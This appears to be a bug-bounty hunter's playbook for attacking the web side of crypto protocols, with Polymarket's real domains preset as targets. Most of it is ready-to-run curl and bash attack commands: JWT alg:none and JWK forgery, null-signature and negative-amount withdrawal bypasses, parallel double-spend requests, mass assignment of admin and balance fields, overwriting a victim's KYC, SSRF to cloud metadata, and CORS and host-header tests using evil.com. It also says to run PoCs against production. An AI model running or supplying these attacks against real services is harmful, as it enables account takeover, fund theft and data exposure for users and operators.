# Web2-on-SC-Programs Playbook — Mechanical Checklist

Run this on every SC bounty target that has a web surface (Cantina/C4/Sherlock/HackenProof/direct-to-team). Polymarket #197 ($10K Medium Web2 pool, In Review in 8 min) is the template finding. <5% of SC hunters touch this surface.

**Usage:** work through the checks top-to-bottom. Each check = one question + one bash command + what counts as a hit. Stop at every hit and build a PoC before resuming.

**Prereqs:** `subfinder`, `httpx`, `jq`, `curl`, `mitmproxy` (optional for capture). Free Tor/VPN recommended for authed testing.

**Time budget:** 2–4h recon, 4–8h hunting. If 0 hits after 8h → return to contracts.

**Variables used throughout:**
```bash
export TARGET="polymarket"        # protocol slug
export BASE="polymarket.com"      # primary domain
export APP="app.polymarket.com"   # dashboard
export API="api.polymarket.com"   # API
export AUTH_TOKEN=""              # set after auth
```

---

## SECTION A — RECON (20 min)

### A1. Subdomain enumeration
```bash
subfinder -d "$BASE" -silent | tee /tmp/subs.txt
curl -s "https://crt.sh/?q=%25.$BASE&output=json" | jq -r '.[].name_value' | sort -u >> /tmp/subs.txt
sort -u /tmp/subs.txt | httpx -silent -status-code -title -tech-detect
```
**Hit when:** Any of these subdomains resolve — `admin.*`, `staff.*`, `internal.*`, `ops.*`, `dev.*`, `staging.*`, `relay*.*`, `gateway.*`, `indexer.*`, `subgraph.*`, `rpc.*`. Each is a separate attack surface. Log them.

### A2. Tech stack fingerprint
```bash
curl -sI "https://$APP" | grep -iE 'server|x-powered-by|x-vercel|cloudflare|x-amz'
curl -s "https://$APP" | grep -oE '__NEXT_DATA__|__nuxt|ng-version|__vite' | head -3
curl -s "https://$APP/_next/static/chunks/main-*.js" -o /dev/null -w "%{http_code}\n"
```
**Hit when:** Next.js detected → also run `NEXTJS-HUNT-CHECKLIST.md`. Vercel detected → try Exodus F15 wildcard bypass (preview deploys reach prod API).

### A3. Source map exposure
```bash
curl -s "https://$APP" | grep -oE '/_next/static/chunks/[a-zA-Z0-9_.-]+\.js' | head -5 | while read p; do
  curl -sI "https://$APP${p}.map" -w "%{http_code} ${p}.map\n" -o /dev/null
done
```
**Hit when:** `200` returned on any `.js.map` → full server route knowledge. Extract all routes:
```bash
curl -s "https://$APP/_next/static/chunks/app/page-*.js.map" | jq -r '.sources[]' | grep -v node_modules | head -30
```

### A4. API surface discovery
```bash
for p in /openapi.json /swagger.json /swagger-ui /api-docs /docs /redoc /graphql /v1 /v2 /v3 /trpc /.well-known/openapi; do
  printf "%s\t" "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://$API$p"
done
```
**Hit when:** `200` on any = full endpoint list leaked. GraphQL introspection enabled? Next check:

### A5. GraphQL introspection
```bash
curl -s -X POST "https://$API/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq '.data.__schema.types | length'
```
**Hit when:** Returns > 0. Then grep for mutations:
```bash
curl -s -X POST "https://$API/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name description}}}}"}' | jq '.data.__schema.mutationType.fields[] | .name' | grep -iE 'admin|promote|delete|override|withdraw|internal|debug'
```
Any admin-flavored mutation that's callable unauthenticated = Critical.

### A6. JS bundle route extraction
```bash
curl -s "https://$APP" | grep -oE '/_next/static/chunks/[a-zA-Z0-9_-]+\.js' | head -10 | while read p; do
  curl -s "https://$APP$p"
done | grep -oE '["\x27]/api/[a-zA-Z0-9_/-]+["\x27]' | sort -u | head -50
```
**Hit when:** Routes found that aren't in docs. Hit every one with auth (Section B).

---

## SECTION B — AUTHENTICATED SESSION (30 min)

**Rule 29 mandatory:** Create account first. Capture token. Test every endpoint with it.

### B1. Capture a valid session
```bash
# After login in browser + DevTools → Copy as cURL
# Extract Bearer / session cookie
export AUTH_TOKEN="Bearer eyJ..."
export COOKIE="session=abc123"
```

### B2. JWT alg:none bypass
```bash
TOKEN="${AUTH_TOKEN#Bearer }"
H=$(echo -n "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null)
echo "Original header: $H"
# Craft alg:none version
NEW_H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n "$TOKEN" | cut -d. -f2)
FORGED="${NEW_H}.${PAYLOAD}."
curl -s -w "%{http_code}\n" -H "Authorization: Bearer $FORGED" "https://$API/user/me"
```
**Hit when:** Returns `200` or user data. Rule 19/21/22 apply.

### B3. JWT JWK header injection (RFC 8725 §2.4 violation)
```bash
# Generate attacker RSA key, embed as jwk header param
# Server trust jwk from header = forge any user
# See tools: https://github.com/ticarpi/jwt_tool
jwt_tool "$TOKEN" -X i -pk /tmp/attacker.pem
```
**Hit when:** Forged token accepted.

### B4. Null/empty/type-confusion on auth fields
Polymarket #197 class. For every auth endpoint, mutate critical fields:
```bash
# Template — replace with real endpoint + real payload
for mut in 'null' '""' '"0x0"' '{}' '[]' '0' 'false'; do
  curl -s -w "%{http_code}\n" -X POST "https://$API/withdraw" \
    -H "Authorization: $AUTH_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"signature\": $mut, \"amount\":\"1\"}" | tail -1
done
```
**Hit when:** `200` on any non-valid signature. Fund-at-risk path.

### B5. Session not invalidated on logout
```bash
# 1. Capture token T
# 2. POST /auth/logout with T
# 3. Immediately use T again
curl -s -X POST "https://$API/auth/logout" -H "Authorization: $AUTH_TOKEN"
sleep 1
curl -s -w "%{http_code}\n" "https://$API/user/me" -H "Authorization: $AUTH_TOKEN" | tail -1
```
**Hit when:** `200` after logout = token remains valid server-side.

### B6. Cookie scope over-broad
```bash
curl -s -c /tmp/c -I "https://$APP/login" | grep -i set-cookie
cat /tmp/c
```
**Hit when:** `Domain=.polymarket.com` → any subdomain (including uncontrolled like `support.polymarket.com` or a takeover candidate from A1) reads the cookie.

### B7. SIWE/personal_sign replay
```bash
# If target uses SIWE: check if signature binds domain + chain-id + nonce
# Paste captured signed message into:
python3 -c "
import base64, json
msg = '''[PASTE SIWE MESSAGE]'''
print('has nonce:', 'Nonce:' in msg)
print('has chain-id:', 'Chain ID:' in msg)
print('has domain:', msg.split(chr(10))[0])
"
```
**Hit when:** Missing nonce or chain-id → cross-chain/session replay.

---

## SECTION C — AUTHORIZATION / IDOR (30 min)

Build the **actor × resource** matrix. For every auth'd endpoint, swap IDs.

### C1. Horizontal IDOR sweep
```bash
# For each endpoint returning /user/{id}/* or /order/{id}:
curl -s "https://$API/user/$VICTIM_ID/balance" -H "Authorization: $AUTH_TOKEN"
curl -s "https://$API/order/$VICTIM_ORDER" -H "Authorization: $AUTH_TOKEN"
```
**Hit when:** Returns victim data / modifies victim state.

### C2. Vertical escalation — guess admin paths
```bash
for p in /admin /admin/users /staff /internal /debug /ops /.env /actuator /api/admin /v1/admin; do
  printf "%s\t" "$p"
  curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: $AUTH_TOKEN" "https://$API$p"
done
```
**Hit when:** Any `200`/`401`-distinguishable-from-`404`.

### C3. Mass assignment
```bash
# On any PATCH/PUT user endpoint, inject privileged fields
curl -s -X PATCH "https://$API/user/me" \
  -H "Authorization: $AUTH_TOKEN" -H "Content-Type: application/json" \
  -d '{"isAdmin":true,"role":"admin","kyc_level":5,"balance":99999,"email_verified":true}'
curl -s "https://$API/user/me" -H "Authorization: $AUTH_TOKEN" | jq '.'
```
**Hit when:** Any privileged field sticks.

### C4. GraphQL operation-level authz
```bash
# Call a known admin-only mutation with low-priv session
curl -s -X POST "https://$API/graphql" \
  -H "Authorization: $AUTH_TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"mutation{deleteUser(id:\"1\"){id}}"}'
```
**Hit when:** No `UNAUTHORIZED` error.

---

## SECTION D — FUND-AT-RISK ACTION MATRIX (45 min)

For each of these, check (a) auth gating, (b) parameter validation, (c) race conditions.

### D1. Deposit / withdraw
```bash
# Negative amount
curl -s -X POST "https://$API/withdraw" -H "Authorization: $AUTH_TOKEN" \
  -d '{"amount":"-100","to":"0x..."}' -H "Content-Type: application/json"
# Huge amount / scientific
for a in "-1" "1e30" "99999999999999999999999999" "0.0000000001" "NaN" "Infinity"; do
  curl -s -w "%{http_code}\n" -X POST "https://$API/withdraw" \
    -H "Authorization: $AUTH_TOKEN" -H "Content-Type: application/json" \
    -d "{\"amount\":\"$a\"}" | tail -1
done
```
**Hit when:** Accepted.

### D2. Double-spend / race condition
```bash
# Two parallel withdrawals with same nonce
for i in 1 2; do
  curl -s -X POST "https://$API/withdraw" -H "Authorization: $AUTH_TOKEN" \
    -H "Content-Type: application/json" -d '{"amount":"100","nonce":42}' &
done
wait
curl -s "https://$API/user/me" -H "Authorization: $AUTH_TOKEN" | jq '.balance'
```
**Hit when:** Two settlements on one balance snapshot.

### D3. Recipient/address whitelist bypass
```bash
# If protocol has address book + cooldown
curl -s -X POST "https://$API/withdraw" -H "Authorization: $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":"1","to":"0xATTACKER","whitelist_id":"VICTIM_ENTRY_ID"}'
```
**Hit when:** IDOR on whitelist_id lets attacker withdraw to their address.

### D4. Currency confusion
```bash
# Deposit 1 USDC, withdraw 1 WBTC via decimal/symbol injection
curl -s -X POST "https://$API/withdraw" -H "Authorization: $AUTH_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":"1","currency":"WBTC","decimals":6}'
```
**Hit when:** Server trusts client-side `decimals` or `currency` mapping.

### D5. KYC / level override
```bash
# Try re-upload KYC with different name
curl -s -X POST "https://$API/kyc/submit" -H "Authorization: $AUTH_TOKEN" \
  -F "name=Attacker" -F "doc=@/tmp/fake.jpg" -F "user_id=VICTIM"
```
**Hit when:** Overwrites victim's KYC (Crypto.com class).

---

## SECTION E — INFRA (20 min)

### E1. RPC namespace probe (Rule 26 — mandatory)
```bash
RPC="https://rpc.$BASE"
for m in admin_peers admin_nodeInfo debug_traceTransaction personal_listAccounts \
         txpool_content miner_start net_listening web3_clientVersion; do
  r=$(curl -s -X POST "$RPC" -H "Content-Type: application/json" \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$m\",\"params\":[],\"id\":1}" --max-time 5)
  echo "$m: $r"
done
```
**Hit when:** `admin_*`/`personal_*`/`debug_*` return data (1inch F01 class, $50K).

### E2. CORS misconfig
```bash
curl -sI -H "Origin: https://evil.com" "https://$API/user/me" | grep -iE 'access-control|vary'
```
**Hit when:** `Access-Control-Allow-Origin: https://evil.com` + `Allow-Credentials: true` → cross-origin steal.

### E3. SSRF via thumbnail/webhook/PDF
```bash
# Any endpoint that fetches a URL attacker-controls
curl -s -X POST "https://$API/upload-avatar" -H "Authorization: $AUTH_TOKEN" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
curl -s -X POST "https://$API/webhook/test" -H "Authorization: $AUTH_TOKEN" \
  -d '{"url":"http://localhost:6379"}'
```
**Hit when:** Internal data returned or connection confirmed.

### E4. Host header injection
```bash
curl -s -X POST "https://$API/auth/forgot-password" -H "Host: evil.com" \
  -d '{"email":"victim@foo.com"}'
# Check email link — if contains evil.com → account takeover vector
```

### E5. Vercel wildcard / preview bypass (Exodus F15 class)
```bash
# Given prod app at app.protocol.com on Vercel:
# Preview deployment pattern: {branch}-{project}.vercel.app
# Try bypassing WAF via vercel.app direct:
curl -sI "https://protocol-git-main-org.vercel.app/api/admin"
```
**Hit when:** Hits backend without WAF protection that's on prod domain.

### E6. Open S3 / GCS
```bash
HOST=$(curl -sI "https://$API" | grep -i 'x-amz\|s3\|gcs' | head -1)
# Try bucket discovery from URL patterns in JS
curl -s "https://$APP" | grep -oE '(s3\.[a-z0-9.-]+\.amazonaws\.com/[a-z0-9.-]+|[a-z0-9.-]+\.s3\.[a-z0-9.-]+\.amazonaws\.com|storage\.googleapis\.com/[a-z0-9.-]+)' | sort -u
# For each bucket:
curl -s "https://BUCKET.s3.amazonaws.com/?list-type=2"  # listing
```
**Hit when:** Listing works (public) OR writable via signed URL forgery.

---

## SECTION F — SUBMISSION CHECKLIST

Before writing, answer:

- [ ] **Which pool?** — Web2 explicit pool / Primacy of Impact / platform-specific. State this in title tag `[Web2]` and first sentence.
- [ ] **Dollar impact proven?** — on-chain state table at block N showing victim balance Y at risk.
- [ ] **PoC runs?** — cURL against prod (or staging if prod is off-limits). Redact attacker creds, keep victim address.
- [ ] **Chain proof (Rule 36)?** — trace request → vulnerable check → fund movement.
- [ ] **Weight card (Rule 37)?** — if severity ≥ Low with $ impact.
- [ ] **Dupe pre-check** — grep H1 hacktivity for protocol + class. Search GitHub issues.
- [ ] **Pre-emption line** — first body sentence classifies: "This is a Web2-class finding in {protocol}'s pooled Web2 tier, affecting the {component} at {endpoint}."

Run `~/arsenal/audit-lifecycle/bin/preflight-mechanical.sh` before submit.

---

## HIT PRIORITY (when multiple findings land)

1. **Fund drain without interaction** — D1/D2/D3/D4 with unauth → Critical
2. **Fund drain with low-priv auth** — B4 null-gate drain → High
3. **ATO** — B2/B3 JWT forgery → High/Critical
4. **Admin function leak** — C2 + mass assignment → High
5. **Info leak / IDOR read-only** — C1 → Medium
6. **CORS / host header / SSRF** — E2/E3/E4 chain → High if reachable
7. **RPC namespace** — E1 → Critical/High depending on method

Submit the Critical/High first — credibility spillover (rule 16 ENS pattern).
